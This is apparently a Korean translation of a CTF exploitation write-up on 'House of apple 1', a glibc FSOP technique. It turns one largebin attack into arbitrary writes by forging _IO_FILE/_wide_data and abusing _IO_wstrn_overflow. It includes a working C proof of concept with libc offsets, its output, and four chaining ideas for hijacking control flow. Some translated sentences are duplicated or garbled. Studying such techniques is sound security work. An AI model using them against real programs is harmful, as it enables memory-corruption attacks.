---
title: "House_of_apple_1"
description: "translate House of apple 1 by roderick01"
date: 2024-08-24T15:52:32+09:00
authors: ["wiimdy"]
tags: ["pwn", "FSOP"]
categories: ["PWN_DOCS"]
layout: post
toc: true
---

translate House of apple 1 by roderick01

<!--more-->

## 서문

우리 모두 알다시피, glibc의 높은 버전(>= 2.34)은 `__malloc_hook/__free_hook/__realloc_hook` 등 많은 후크 전역 변수를 점차적으로 제거했으며, `hook` 사용에 대한 ctf pwn 질문은 점차 과거의 일이 될 것입니다.

그리고 높은 버전에서의 성공을 활용하려면 기본적으로 위조 및 IO 스트림 공격의 IO_FILE 구조와 분리 될 수 없습니다. 이전에는 많은 마스터들이 `House of pig`, `House of kiwi`, `House of emma`와 같은 몇 가지 훌륭한 공격 방법을 제안했습니다.

그 중 `House of pig`은 `tcache_perthread_struct` 구조를 탈취하거나 임의의 주소 할당을 제어할 수 있어야 하고,
`House of kiwi`은`_IO_helper_jumps + 0xA0` 및 `_IO_helper. _jumps + 0xA8`, `_IO_file_jumps + 0x60`에서 `_IO_file_sync` 포인터를 탈취하는 것 외에도;

`House of emma`는 최소 두 곳의 값을 수정해야 하며, tls 구조의 point_guard(또는 유출할 방법을 찾아야 합니다), IO_FILE을 가짜로 만들거나 vtable을 xxx_cookie_jumps의 주소로 바꿔야 합니다.

전반적으로 위의 방법을 사용하여 IO를 성공적으로 공격하려면 최소 두 번의 쓰기 또는 한 번의 쓰기와 임의의 주소 읽기가 필요합니다. 임의의 주소에 한 번만 쓰기가 주어지는 시나리오(예: `Larbin attack`)를 성공적으로 악용하기는 매우 어렵습니다.

`Larbin attack`은 상위 버전에서 임의의 주소에 힙 주소를 쓰는 몇 안 되는 방법 중 하나이며, 위의 세 가지 방법과 함께 악용되는 경우가 많습니다. 이 백서에서는 `Larbin attack`을 한 번만 사용하고 읽기 및 쓰기 횟수를 제한하는 조건에서 FSOP 익스플로잇을 위한 새로운 익스플로잇 방법을 제시합니다. 참고로 `House of banana` 역시 단 한 번의 라지빈 공격만 필요하지만, IO 스트림이 아닌 rtld_global 구조를 공격합니다.

위 방법의 성공적인 익스플로잇의 전제는 libc 주소와 힙 주소가 유출되었다는 것입니다.

## 사용 조건

하우스 오브 애플을 사용하기 위한 조건은

1. 프로그램이 메인 함수에서 반환하거나 종료 함수를 호출할 수 있음
2. 힙 주소와 라이브러리 주소 유출 가능
3. `Larbin attack` 공격 사용 가능 (한 번이면 충분함)

## 활용 원칙

- 이 설명은 amd64 프로그램을 기반으로 합니다.
- 프로그램이 메인 함수에서 돌아오거나 종료 함수를 실행하면 fcloseall 함수가 호출되고 호출 체인이 이루어집니다:
- exit
  - fcloseall
    - `_IO_cleanup`
      - `_IO_flush_all_lockp`
        - `_IO_OVERFLOW`

마지막으로 `_IO_list_all`에 저장된 각 IO_FILE 구조를 순회하고 조건이 충족되면 각 구조의 `vtable->_overflow` 함수 포인터가 가리키는 함수가 호출됩니다.

largebin 공격을 사용하면 `_IO_list_all` 변수를 탈취하여 가짜 IO_FILE 구조체로 대체할 수 있지만, 이 시점에서도 실제로는 일부 IO 흐름 함수를 계속 사용하여 다른 곳의 값을 수정할 수 있습니다. 다른 곳에서 값을 수정하려면 `_IO_FILE`의 멤버인 `_wide_data`를 사용할 수밖에 없습니다.

```c
struct _IO_FILE_complete
{
  struct _IO_FILE _file;
  __off64_t _offset;
  /* Wide character stream stuff.  */
  struct _IO_codecvt *_codecvt;
  struct _IO_wide_data *_wide_data; // 劫持这个变量
  struct _IO_FILE *_freeres_list;
  void *_freeres_buf;
  size_t __pad5;
  int _mode;
  /* Make sure we don't get into trouble again.  */
  char _unused2[15 * sizeof (int) - 4 * sizeof (void *) - sizeof (size_t)];
};
```

구조체 `_IO_wide_data *_wide_data`는 amd64 프로그램에서 `_IO_FILE`의 오프셋이 0xa0입니다:

```text
amd64：_IO_FILE_complete

0x0:'_flags',
0x8:'_IO_read_ptr',
0x10:'_IO_read_end',
0x18:'_IO_read_base',
0x20:'_IO_write_base',
0x28:'_IO_write_ptr',
0x30:'_IO_write_end',
0x38:'_IO_buf_base',
0x40:'_IO_buf_end',
0x48:'_IO_save_base',
0x50:'_IO_backup_base',
0x58:'_IO_save_end',
0x60:'_markers',
0x68:'_chain',
0x70:'_fileno',
0x74:'_flags2',
0x78:'_old_offset',
0x80:'_cur_column',
0x82:'_vtable_offset',
0x83:'_shortbuf',
0x88:'_lock',
0x90:'_offset',
0x98:'_codecvt',
0xa0:'_wide_data',
0xa8:'_freeres_list',
0xb0:'_freeres_buf',
0xb8:'__pad5',
0xc0:'_mode',
0xc4:'_unused2',
0xd8:'vtable'
```

우리는 `_IO_FILE` 구조를 위조할 때`_wide_data` 변수를 위조한 다음 `_IO_wstrn_overflow`와 같은 특정 함수를 사용하여 알려진 주소 공간의 특정 값을 알려진 값으로 수정할 수 있습니다.

```c
static wint_t
_IO_wstrn_overflow (FILE *fp, wint_t c)
{
  /* When we come to here this means the user supplied buffer is
     filled.  But since we must return the number of characters which
     would have been written in total we must provide a buffer for
     further use.  We can do this by writing on and on in the overflow
     buffer in the _IO_wstrnfile structure.  */
  _IO_wstrnfile *snf = (_IO_wstrnfile *) fp;

  if (fp->_wide_data->_IO_buf_base != snf->overflow_buf)
    {
      _IO_wsetb (fp, snf->overflow_buf,
         snf->overflow_buf + (sizeof (snf->overflow_buf)
                      / sizeof (wchar_t)), 0);

      fp->_wide_data->_IO_write_base = snf->overflow_buf;
      fp->_wide_data->_IO_read_base = snf->overflow_buf;
      fp->_wide_data->_IO_read_ptr = snf->overflow_buf;
      fp->_wide_data->_IO_read_end = (snf->overflow_buf
                      + (sizeof (snf->overflow_buf)
                     / sizeof (wchar_t)));
    }

  fp->_wide_data->_IO_write_ptr = snf->overflow_buf;
  fp->_wide_data->_IO_write_end = snf->overflow_buf;

  /* Since we are not really interested in storing the characters
     which do not fit in the buffer we simply ignore it.  */
  return c;
}
```

함수를 분석하면, 먼저 fp를 `_IO_wstrnfile *` 포인터로 강제로 변환한 다음, `fp->_wide_data->_IO_buf_base ! = snf->overflow_buf`가 유지되는지 확인하고 (보통 유지됩니다), 유지되면 `fp->_wide_data의` `_IO_write_base`, `_IO_read_base`, `_IO_read_ptr` 및 `_IO_read_end`를 `snf->overflow_buf`에 할당합니다. 또는 해당 주소에서 특정 범위 내의 값 오프셋을 설정하고, 마지막으로 `fp->_wide_data`의 `_IO_write_ptr` 및 `_IO_write_end`에 값을 할당합니다.

즉, `fp->_wide_data`를 제어하면 `fp->_wide_data`에서 특정 범위 내의 메모리 값을 제어할 수 있으며, 이는 임의의 주소에 쓰는 것과 동일합니다.

여기서 `_IO_wsetb` 함수 내에서 프리 바이패스해야 하는 경우가 있습니다:

```c
void
_IO_wsetb (FILE *f, wchar_t *b, wchar_t *eb, int a)
{
  if (f->_wide_data->_IO_buf_base && !(f->_flags2 & _IO_FLAGS2_USER_WBUF))
    free (f->_wide_data->_IO_buf_base); // 其不为0的时候不要执行到这里
  f->_wide_data->_IO_buf_base = b;
  f->_wide_data->_IO_buf_end = eb;
  if (a)
    f->_flags2 &= ~_IO_FLAGS2_USER_WBUF;
  else
    f->_flags2 |= _IO_FLAGS2_USER_WBUF;
}
```

`_IOwstrnfile`에 관련된 구조는 다음과 같습니다.

```c
struct _IO_str_fields
{
  _IO_alloc_type _allocate_buffer_unused;
  _IO_free_type _free_buffer_unused;
};

struct _IO_streambuf
{
  FILE _f;
  const struct _IO_jump_t *vtable;
};

typedef struct _IO_strfile_
{
  struct _IO_streambuf _sbf;
  struct _IO_str_fields _s;
} _IO_strfile;

typedef struct
{
  _IO_strfile f;
  /* This is used for the characters which do not fit in the buffer
     provided by the user.  */
  char overflow_buf[64];
} _IO_strnfile;


typedef struct
{
  _IO_strfile f;
  /* This is used for the characters which do not fit in the buffer
     provided by the user.  */
  wchar_t overflow_buf[64]; // overflow_buf在这里********
} _IO_wstrnfile;
```

여기서 overflow_buf는 `_IO_FILE 구조체` 다음에 `_IO_FILE` 구조체를 기준으로 0xf0으로 오프셋됩니다.

그리고 `_IO_와이드_데이터 구조체`는 다음과 같습니다:

```c
struct _IO_wide_data
{
  wchar_t *_IO_read_ptr;    /* Current read pointer */
  wchar_t *_IO_read_end;    /* End of get area. */
  wchar_t *_IO_read_base;   /* Start of putback+get area. */
  wchar_t *_IO_write_base;  /* Start of put area. */
  wchar_t *_IO_write_ptr;   /* Current put pointer. */
  wchar_t *_IO_write_end;   /* End of put area. */
  wchar_t *_IO_buf_base;    /* Start of reserve area. */
  wchar_t *_IO_buf_end;     /* End of reserve area. */
  /* The following fields are used to support backing up and undo. */
  wchar_t *_IO_save_base;   /* Pointer to start of non-current get area. */
  wchar_t *_IO_backup_base; /* Pointer to first valid character of
                   backup area */
  wchar_t *_IO_save_end;    /* Pointer to end of non-current get area. */

  __mbstate_t _IO_state;
  __mbstate_t _IO_last_state;
  struct _IO_codecvt _codecvt;
  wchar_t _shortbuf[1];
  const struct _IO_jump_t *_wide_vtable;
};
```

즉, 이 시점에서 `_IO_FILE` 구조체가 힙에 위조되고 그 주소가 A로 알려진 경우, A + 0xd8은 `_IO_wstrn_jumps` 주소로 대체되고, A + 0xc0(`fp->IO_wdata`)은 B로 설정되며, 다른 멤버는 `_IO_OVERFLOW`로 호출할 수 있도록 설정됩니다. 그러면 exit 함수는 `_IO_wstrn_overflow` 함수까지 호출하여 주소 영역의 내용을 B에서 B + 0x38까지 A + 0xf0 또는 A + 0x1f0으로 대체합니다.

오버플로 함수를 호출하고 주소 영역의 내용을 B에서 B + 0x38까지를 A + 0xf0 또는 A + 0x1f0으로 바꿉니다.

즉 `wide_data->read_ptr ~ buf_base` 까지 값이 `fp->overflow_buf` 값으로 바뀐다.

이를 확인하기 위해 데모 프로그램을 작성해 보세요:

```c
#include<stdio.h>
#include<stdlib.h>
#include<stdint.h>
#include<unistd.h>
#include <string.h>

void main()
{
    setbuf(stdout, 0);
    setbuf(stdin, 0);
    setvbuf(stderr, 0, 2, 0);
    puts("[*] allocate a 0x100 chunk");
    size_t *p1 = malloc(0xf0);
    size_t *tmp = p1;
    size_t old_value = 0x1122334455667788;
    for (size_t i = 0; i < 0x100 / 8; i++)
    {
        p1[i] = old_value;
    }
    puts("===========================old value=======================");
    for (size_t i = 0; i < 4; i++)
    {
        printf("[%p]: 0x%016lx  0x%016lxn", tmp, tmp[0], tmp[1]);
        tmp += 2;
    }
    puts("===========================old value=======================");

    size_t puts_addr = (size_t)&puts;
    printf("[*] puts address: %pn", (void *)puts_addr);
    size_t stderr_write_ptr_addr = puts_addr + 0x1997b8;
    printf("[*] stderr->_IO_write_ptr address: %pn", (void *)stderr_write_ptr_addr);
    size_t stderr_flags2_addr = puts_addr + 0x199804;
    printf("[*] stderr->_flags2 address: %pn", (void *)stderr_flags2_addr);
    size_t stderr_wide_data_addr = puts_addr + 0x199830;
    printf("[*] stderr->_wide_data address: %pn", (void *)stderr_wide_data_addr);
    size_t sdterr_vtable_addr = puts_addr + 0x199868;
    printf("[*] stderr->vtable address: %pn", (void *)sdterr_vtable_addr);
    size_t _IO_wstrn_jumps_addr = puts_addr + 0x194ed0;
    printf("[*] _IO_wstrn_jumps address: %pn", (void *)_IO_wstrn_jumps_addr);

    puts("[+] step 1: change stderr->_IO_write_ptr to -1");
    *(size_t *)stderr_write_ptr_addr = (size_t)-1;

    puts("[+] step 2: change stderr->_flags2 to 8");
    *(size_t *)stderr_flags2_addr = 8;

    puts("[+] step 3: replace stderr->_wide_data with the allocated chunk");
    *(size_t *)stderr_wide_data_addr = (size_t)p1;

    puts("[+] step 4: replace stderr->vtable with _IO_wstrn_jumps");
    *(size_t *)sdterr_vtable_addr = (size_t)_IO_wstrn_jumps_addr;

    puts("[+] step 5: call fcloseall and trigger house of apple");
    fcloseall();
    tmp = p1;
    puts("===========================new value=======================");
    for (size_t i = 0; i < 4; i++)
    {
        printf("[%p]: 0x%016lx  0x%016lxn", tmp, tmp[0], tmp[1]);
        tmp += 2;
    }
    puts("===========================new value=======================");
}
```

출력값:

```text
roderick@ee8b10ad26b9:~/hack$ gcc demo.c -o demo -g -w && ./demo
[*] allocate a 0x100 chunk
===========================old value=======================
[0x55cfb956d2a0]: 0x1122334455667788  0x1122334455667788
[0x55cfb956d2b0]: 0x1122334455667788  0x1122334455667788
[0x55cfb956d2c0]: 0x1122334455667788  0x1122334455667788
[0x55cfb956d2d0]: 0x1122334455667788  0x1122334455667788
===========================old value=======================
[*] puts address: 0x7f648b8a6ef0
[*] stderr->_IO_write_ptr address: 0x7f648ba406a8
[*] stderr->_flags2 address: 0x7f648ba406f4
[*] stderr->_wide_data address: 0x7f648ba40720
[*] stderr->vtable address: 0x7f648ba40758
[*] _IO_wstrn_jumps address: 0x7f648ba3bdc0
[+] step 1: change stderr->_IO_write_ptr to -1
[+] step 2: change stderr->_flags2 to 8
[+] step 3: replace stderr->_wide_data with the allocated chunk
[+] step 4: replace stderr->vtable with _IO_wstrn_jumps
[+] step 5: call fcloseall and trigger house of apple
===========================new value=======================
[0x55cfb956d2a0]: 0x00007f648ba40770  0x00007f648ba40870
[0x55cfb956d2b0]: 0x00007f648ba40770  0x00007f648ba40770
[0x55cfb956d2c0]: 0x00007f648ba40770  0x00007f648ba40770
[0x55cfb956d2d0]: 0x00007f648ba40770  0x00007f648ba40870
===========================new value=======================
```

출력에서 볼 수 있듯이 `sdterr->_wide_data`가 가리키는 주소 공간의 메모리가 성공적으로 수정되었습니다.

![puts_xsputn.png](/assets/img/pwn/house_of_apple_1-1.png)

![puts_xsputn.png](/assets/img/pwn/house_of_apple_1-2.png)

즉 우리가 설정한 `fp->_wide_data` 에 fp + 0xf0 , 0x1f0 값이 저장 된다.

## 아이디어 활용

위의 분석을 통해, 단 하나의 LARGEBIN 공격만 주어지면 `_IO_wstrn_overflow` 함수를 사용하여 임의의 주소 공간의 값을 알려진 주소로 수정할 수 있으며, 이 알려진 주소는 일반적으로 힙 주소라는 것을 알 수 있습니다.
그런 다음 두 개 이상의 `_IO_FILE` 구조를 위조하고 CHAIN 필드를 통해 이 구조들을 연결하면 조합 익스플로잇을 할 수 있습니다. 이를 바탕으로 저는 하우스 오브 애플에서 최소 네 가지 익스플로잇 아이디어를 요약했습니다.

### 아이디어 1: tcache 스레드 변수 수정하기

이 아이디어는 임의의 주소 할당을 위해 `_IO_str_overflow`에서 malloc을 사용하고 임의의 주소 덮어쓰기를 위해 memcpy를 사용하는 `House of pig` 아이디어를 사용해야 합니다. 코드 스니펫은 다음과 같습니다

```c
int
_IO_str_overflow (FILE *fp, int c)
{
        // ......
      char *new_buf;
      char *old_buf = fp->_IO_buf_base; // 赋值为old_buf
      size_t old_blen = _IO_blen (fp);
      size_t new_size = 2 * old_blen + 100;
      if (new_size < old_blen)
        return EOF;
      new_buf = malloc (new_size); // 임의 주소 할당
      if (new_buf == NULL)
        {
          /*      __ferror(fp) = 1; */
          return EOF;
        }
      if (old_buf)
        {
          memcpy (new_buf, old_buf, old_blen); // _IO_buf_base를 하이재킹하여 임의의 주소에 값을 쓰기
          free (old_buf);
      // ..
		}.....
  }
```

활용 단계는 다음과 같습니다:

- 두 개 이상의 `_IO_FILE` 구조를 가짜로 만듭니다.
- 첫 번째 `_IO_FILE` 구조는 `_IO_wstrn_overflow` 함수를 사용하여 tcache 전역 변수를 알려진 값으로 수정하고, tcache 빈의 할당도 제어합니다.
- 두 번째 `_IO_FILE` 구조는 `_IO_OVERFLOW`를 수행하며 `_IO_str_overflow`에서 malloc 함수를 사용하여 임의 주소 할당을 수정하고 memcpy를 사용하여 어떤 주소에든 값을 쓸 수 있도록 합니다.
- OVERFLOW, `_IO_str_overflow`의 malloc 함수를 사용하여 임의의 주소를 할당하고, memcpy를 사용하여 임의의 주소에서 임의의 값을 쓸 수 있게 합니다.
- 임의의 값을 쓰기 위해 두 개의 임의 주소를 사용하여 `_IO_accept_foreign_vtables`의 값을 수정하기 위해 pointer*guard 및 IO_accept_foreign_vtables 함수를 우회하는 `\_IO*. vtable_check` 함수를 우회하기 위해 (또는 아무 주소에나 값을 한 번 써서 libc.got의 함수 주소를 수정하면, 많은 IO 스트림 함수 호출 strlen/strcpy/memcpy/memset 등이 libc.got의 함수로 호출됩니다)
- `_IO_FILE`을 사용하여 무작위로 가짜 vtable 하이재킹을 수행합니다. `_IO_FILE`을 사용하면 프로그램 제어 흐름을 가로채기 위해 자유롭게 가짜 vtable을 만들 수 있습니다.

모든 값을 쓸 수 있는 주소를 가질 수 있기 때문에 매우 많은 수의 변수와 구조로 제어 할 수 있지만 매우 유연하고 `_IO_xxx_jumps` 매핑 된 주소 공간의 제목과 같은 특정 주제와 함께 사용해야 할 필요가 있으므로 함수 포인터를 직접 수정할 수 있습니다.

### 아이디어 2: mp_structure 수정하기

아이디어는 위와 비슷하지만, tcachebin 할당을 탈취하는 것은 mp\_.tcache_bins 변수를 수정하여 수행됩니다. 이 구조를 공격할 때의 장점은 스레드 전역 변수, 로컬과 원격의 tls 구조의 주소가 항상 같지 않고 때로는 주소를 폭파해야 하는 경우도 있기 때문에 원격 공격 시 주소를 폭파할 필요가 없다는 것입니다.

이를 익스플로잇하는 단계는 다음과 같습니다:

- 최소 두 개의 `_IO_FILE` 구조를 위조합니다.
- 첫 번째 `_IO_FILE` 구조는 `_IO_wstrn_overflow` 함수를 사용하여 `_IO_OVERFLOW`를 수행하여 `mp_.tcache_bins`를 매우 큰 값으로 수정하여 매우 큰 청크도 tcachebin을 통해 관리되도록 합니다. 다음 과정은 위와 동일합니다.

### 아이디어 3: `House of emma`의 pointer_guard 스레드 변수 수정하기

- 두 개의 가짜 `_IO_FILE` 구조체 첫 번째 `_IO_FILE` 구조체는 `_IO_wstrn_overflow` 함수를 사용하여 `_IO_OVERFLOW`를 실행하고, tls 구조체 pointer_guard의 값을 알려진 값으로 수정합니다.
- 두 번째 `_IO_FILE` 구조체는 `House of emma`을 수행하는 데 사용되었습니다. 프로그램 실행 흐름 제어

### 아이디어 4: global_max_fast 전역 변수 수정하기

이 아이디어는 또한 매우 유연합니다.
이 변수를 수정한 후 크기가 큰 청크를 해제하여 point_guard 또는 tcache 변수를 덮어쓰기만 하면 됩니다. 저는 이를 `House of apple` + `House of corrison`이라고 부릅니다.

활용 과정은 기본적으로 이전과 동일하므로 여기서는 자세히 설명하지 않겠습니다.

사실 다른 아이디어도 있습니다. 예를 들어 메인\_아레나를 탈취할 수도 있지만 이 구조의 사용은 더 복잡하고 필요한 공간이 더 커집니다. 위의 아이디어를 활용하는 과정에서 `_IO_FILE` 구조를 잘못된 위치에 구성하도록 선택할 수 있으며, 요구 사항을 충족하는 키 필드만 있으면 더 많은 공간을 절약할 수 있습니다.

## REFERENCE

<https://bbs.kanxue.com/thread-273418.htm>
